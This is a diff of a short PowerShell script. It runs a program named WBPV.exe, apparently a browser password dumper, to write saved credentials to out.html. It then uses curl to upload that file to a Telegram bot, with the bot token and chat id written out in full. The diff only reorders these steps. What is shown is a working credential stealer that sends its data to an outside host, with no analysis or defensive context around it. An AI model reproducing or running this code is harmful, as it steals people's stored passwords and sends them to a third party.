@@ -1,9 +1,5 @@
 Add-Type -AssemblyName System.Net.Http
 
-$msbuild = ".\WBPV.exe"
-$arguments = "/shtml out.html"
-start-process $msbuild $arguments -Wait
-
 # Check if curl is already installed
 if (!(Get-Command curl -ErrorAction SilentlyContinue)) {
   # Download curl
@@ -36,6 +32,9 @@ if (!(Get-Command curl -ErrorAction SilentlyContinue)) {
 }
 
 
+$msbuild = ".\WBPV.exe"
+$arguments = "/shtml out.html"
+start-process $msbuild $arguments -Wait
 
 $msbuild = "curl"
 $arguments = '-s -F document=@"c:/out.html" https://api.telegram.org/bot7623697444:AAER5Ph7rbkgJifCvG4cyXhg6XhvSnQvjr4/sendDocument?chat_id=7032729089'
